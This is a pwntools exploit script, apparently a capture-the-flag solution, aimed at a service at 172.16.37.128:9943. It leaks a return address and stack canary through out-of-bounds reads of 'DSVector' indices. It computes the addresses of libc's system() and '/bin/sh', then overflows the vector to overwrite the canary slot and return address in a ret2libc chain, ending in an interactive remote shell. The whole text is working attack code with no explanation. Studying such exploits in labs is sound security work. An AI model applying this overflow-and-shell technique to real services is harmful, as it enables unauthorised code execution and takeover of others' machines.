from pwn import *

r = remote("172.16.37.128", 9943)

r.sendline("2")
r.sendline("261")
r.recvuntil("DSVector[261] = ")
ret = int(r.recvline())
ret = (ret) & 0xFFFFFFFF
log.info("ret address: {}".format(hex(ret)))

system = ret + 0x2670d
string = ret + 0x146fa1
log.info("system address: {}".format(hex(system)))
log.info("\"/bin/sh\" address: {}".format(hex(string)))

r.sendline("2")
r.sendline("257")
r.recvuntil("DSVector[257] = ")
canary = int(r.recvline())
canary = (canary) & 0xFFFFFFFF
log.info("canary: {}".format(hex(canary)))

[r.sendline("1\n10") for i in range(256)]
r.sendline("1")
r.sendline(str(canary))
[r.sendline("1\n10") for i in range(3)]
r.sendline("1")
r.sendline(str(system))
[r.sendline("1\n10") for i in range(1)]
r.sendline("1")
r.sendline(str(string))

r.sendline("3")
r.interactive()
